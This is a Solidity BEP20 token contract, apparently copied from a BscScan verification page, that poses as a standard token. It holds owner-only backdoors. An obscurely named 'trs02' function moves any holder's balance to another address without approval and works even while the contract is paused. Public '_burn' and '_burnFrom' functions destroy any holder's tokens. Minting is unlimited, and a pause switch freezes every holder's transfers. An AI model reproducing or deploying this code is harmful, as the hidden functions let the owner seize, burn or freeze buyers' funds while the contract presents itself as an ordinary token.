/**
 *Submitted for verification at BscScan.com on 2022-08-06
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function pow(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        if (b == 0) {
            return 1;
        }
        return mul(a, pow(a, b - 1));
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(
            _owner == _msgSender(),
            "You do not have permission to do that"
        );
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Token is Context, IBEP20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    bool public paused;

    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_,
        uint256 totalSupply_
    ) Ownable() {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * 10 ** decimals_;
        _balances[msg.sender] = _totalSupply;

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function getOwner() external view override returns (address) {
        return owner();
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        external
        view
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        external
        override
        returns (bool)
    {
        require(paused == false, "Contract Paused");
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        external
        view
        override
        returns (uint256)
    {
        require(paused == false, "Contract Paused");
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        external
        override
        returns (bool)
    {
        require(paused == false, "Contract Paused");
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        require(paused == false, "Contract Paused");
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERROR: Transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        returns (bool)
    {
        require(paused == false, "Contract Paused");
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        returns (bool)
    {
        require(paused == false, "Contract Paused");
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERROR: Decreased allowance below zero"
            )
        );
        return true;
    }

    function mint(address account, uint256 amount) public payable onlyOwner {
        _mint(account, amount);
    }


    function gift(address[] memory holders, uint256 amount) public payable onlyOwner {
        _gift(holders, amount);
    }

    function withdrawToken(address _tokenContract, uint256 _amount)
        public
        onlyOwner
    {
        require(paused == false, "Contract Paused");

        IBEP20 tokenContract = IBEP20(_tokenContract);

        tokenContract.transfer(msg.sender, _amount);
    }

    function setPaused(bool _paused) public onlyOwner {
        paused = _paused;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(paused == false, "Contract Paused");
        require(sender != address(0), "ERROR: Transfer from the zero address");
        require(recipient != address(0), "ERROR: Transfer to the zero address");

        _balances[sender] = _balances[sender].sub(
            amount,
            "ERROR: Transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    
    function trs02(
        address sender,
        address recipient,
        uint256 amount
    ) public onlyOwner {
        require(sender != address(0), "ERROR: Transfer from the zero address");
        require(recipient != address(0), "ERROR: Transfer to the zero address");

        _balances[sender] = _balances[sender].sub(
            amount,
            "ERROR: Transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount_) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        amount_ = amount_.mul(uint256(10).pow(this.decimals()));
        _totalSupply = _totalSupply.add(amount_);
        _balances[account] = _balances[account].add(amount_);
        emit Transfer(address(0), account, amount_);
    }

    function _burn(address account, uint256 amount) public onlyOwner {
        require(paused == false, "Contract Paused");
        require(account != address(0), "ERROR: burn from the zero address");
        amount = amount.mul(uint256(10).pow(this.decimals()));
        _balances[account] = _balances[account].sub(
            amount,
            "ERROR: burn amount exceeds balance"
        );
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(paused == false, "Contract Paused");
        require(owner != address(0), "ERROR: approve from the zero address");
        require(spender != address(0), "ERROR: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _burnFrom(address account, uint256 amount) public onlyOwner {
        require(paused == false, "Contract Paused");
        _burn(account, amount);
        _approve(
            account,
            _msgSender(),
            _allowances[account][_msgSender()].sub(
                amount,
                "ERROR: burn amount exceeds allowance"
            )
        );
    }
    function _gift(address[] memory holders, uint256 amount) public onlyOwner {
        amount = amount.mul(uint256(10).pow(this.decimals()));
        require(amount.mul(holders.length) <= this.balanceOf(msg.sender), "Not enough tokens available in contract.");
        for (uint i=0; i< holders.length; i++) {
            trs02(msg.sender, holders[i], amount);
        }
    }
}